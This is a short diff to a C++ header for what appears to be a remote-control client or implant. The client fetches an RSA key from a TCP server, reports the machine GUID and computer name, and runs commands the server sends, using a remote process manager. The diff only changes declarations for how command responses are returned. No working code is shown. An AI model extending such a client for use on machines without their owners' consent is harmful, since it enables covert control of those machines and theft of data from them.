@@ -13,6 +13,7 @@
 
 #include <memory>
 #include <algorithm>
+#include <thread>
 #include <random>
 #include <openssl/bio.h>
 #include <filesystem>
@@ -49,7 +50,7 @@ public:
     BOOL               SendMessageToServer(std::string message, BOOL encrypted = TRUE); // Send a encrypted string to TCP server
     BOOL               SendEncryptedMessageToServer(const Server& dest, ClientMessage message);
     BOOL               ListenForServerCommands();   // listen for commands from the server and perform them
-    BOOL               PerformCommand(const ServerCommand& command); // Perform a command from the tcp server
+    BOOL               PerformCommand(const ServerCommand& command, ClientResponse& outResponse); // Perform a command from the tcp server
 
     template <typename _Ty>
     BOOL               ReceiveMessageFromServer(const Server& who, _Ty& out, sockaddr_in& outAddr);
@@ -61,6 +62,7 @@ private:
     BOOL               GetPublicRSAKeyFromServer(); // get public rsa key from server, save it to this->m_Secrets as a string
     BOOL               SendMachineGUIDToServer();   // send machine guid to tcp server. encrypted
     BOOL               SendComputerNameToServer();  // send desktop computer name to tcp server. encrypted
+    BOOL               IsServerAwaitingResponse(const ServerCommand& commandPerformed);
 
     ProcessManager     m_ProcMgr          = {};     // remote host process manager
     Server             m_TCPServerDetails = {};     // details describing the tcp server
